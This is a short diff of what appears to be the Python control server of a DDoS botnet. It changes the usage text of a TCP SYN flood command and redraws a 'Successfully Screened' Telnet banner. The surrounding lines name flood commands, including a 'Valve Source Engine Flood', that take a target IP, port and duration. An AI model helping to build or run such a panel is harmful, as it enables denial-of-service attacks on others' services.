@@ -301,7 +301,7 @@ def command_line(client):
                     else:
                         send(client, Fore.RED + 'Invalid IP-address')
                 else:
-                    send(client, 'Usage: .icmp [IP] [PORT] [TIME]')
+                    send(client, 'Usage: .tcpsyn [IP] [PORT] [TIME]')
                     send(client, 'Use port 0 for random port mode')
             elif command == '.VSE': # Valve Source Engine Flood
                 if len(args) == 4:
@@ -523,8 +523,12 @@ def handle_client(client, address):
 
 # Screening and Broadcasting (Via Telnet)
 screenedSuccessfully = """\x1b[0m
-                        Successfully Screened
-                     ───────────────────────────
+  ╔════════════════════════════════════╗
+  ║                                    ║
+  ║        Successfully Screened       ║
+  ║     ───────────────────────────    ║
+  ║              ⤥ Logs ⤦              ║
+  ╚════════════════════════════════════╝
 """
 
 def main():
